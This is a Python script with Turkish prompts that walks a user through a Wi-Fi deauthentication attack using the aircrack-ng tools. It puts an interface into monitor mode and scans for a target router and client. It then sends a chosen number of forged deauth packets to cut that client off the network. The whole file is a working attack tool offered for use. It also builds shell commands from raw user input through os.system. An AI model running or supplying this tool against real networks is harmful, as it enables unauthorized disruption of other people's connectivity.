import subprocess
from time import sleep
from colorama import Fore
import os

#interface secimi
while True:
    print(Fore.YELLOW)
    print(" ")
    print("Lutfen interface'nizi seciniz ! ")
    print(" ")
    print(Fore.RESET)
    print(Fore.BLUE)
    print("1 - wlan0")
    print("2 - wlan1")
    print("3 - eth0")
    print(Fore.RESET)
    print(" ")

    try:
        print(Fore.GREEN)
        interface = int(input("Interface : "))
        print(Fore.RESET)
    except:
        subprocess.call(["clear"])
        sleep(2)
        print(Fore.RED)
        print("Lutfen seceneklerden birisini seciniz !!!")
        print(Fore.RESET)
        continue
  

    interface_typ = type(interface)

    #print(interface_typ)

    if (interface_typ == int):
        if (interface == 1):
            interface = "wlan0"
            print(" ")
            print("Interface'niz " + (Fore.CYAN+"wlan0")+(Fore.RESET) +"'dir.")
            sleep(2)
            break
        elif (interface == 2):
            print(" ")
            interface = "wlan1"
            print("Interface'niz " + (Fore.CYAN+"wlan1")+(Fore.RESET) +"'dir.")
            sleep(2)
            break
        elif (interface == 3):
            print(" ")
            interface = "eth0"
            print("Interface'niz " + (Fore.CYAN+"eth0")+(Fore.RESET) +"'dir.")
            sleep(2)
            break        
        else:
            os.system("clear")
            print(Fore.RED)
            print("Girmis Olduğunuz deger seceneklerden biri olmalidir")
            print(Fore.RESET)
            




def airmon(interface):
    subprocess.call(["airmon-ng","start",interface])   

def airmon_stop(interfacemon):
    subprocess.call(["airmon-ng","stop",interfacemon])
    print(Fore.CYAN)
    print("Program Kapandı ...")
    print(Fore.RESET)

def airodump(interfacemon):
    subprocess.call(["clear"])
    
    print(Fore.YELLOW)
    print("----- Acilan pencereden hedef modemin bssid yeri kopyalayın ve CH rakamını aklınızda tutun ----- ")
    print(Fore.RESET)
    print(" ")
    print("Isiniz bitince acilan pencerede ctrl + c yaparak cikin.")
    sleep(5)
    os.system("airodump-ng "+ interfacemon)
    
    print(Fore.RED)
    print("----------------------------------------------")
    print(Fore.YELLOW)
    bssid = input("BSSID : ")
    channel = input("CH : ")
    print(Fore.RESET)
    subprocess.call(["clear"])
    return bssid, channel

def airodump_two(bssid,channel,interfacemon):
    print(Fore.YELLOW)
    print("----- Acilan pencerede baglantisini kesmek istediginiz client mac'i kopyalayin (bssid'den sonra gelen mac'i) ")
    print(Fore.RESET)
    sleep(5)
    print(" ")
    subprocess.call(["clear"])
    print("Isiniz bitince acilan pencerede ctrl + c yaparak cikin.")
    #subprocess.call(["qterminal","-e","airodump-ng","--bssid",bssid ])
    os.system("airodump-ng "+ "--bssid "+ bssid+ " --channel "+ channel+ " "+ interfacemon)
    
    print(" ")
    print(Fore.RED)
    print("----------------------------------------------")
    print(Fore.YELLOW)
    client_mac = input("Client Mac : ")
    packet = input("Paket sayisi : ")
    print(Fore.RESET)
    return packet, client_mac

def aireplay(bssid,channel,client_mac,packet,interfacemon):
    subprocess.call(["aireplay-ng","--deauth",packet,"-a",bssid,"-c",client_mac,interfacemon])



try:                            
    airmon(interface)#1.adim
    interfacemon = interface + "mon"
    (bssid,channel) = airodump(interfacemon) #2.adim
    
    (packet,client_mac) = airodump_two(bssid,channel,interfacemon)#3.adim
    aireplay(bssid,channel,client_mac,packet,interfacemon)#4.adim
    airmon_stop(interfacemon)
except KeyboardInterrupt:
    airmon_stop(interfacemon)

    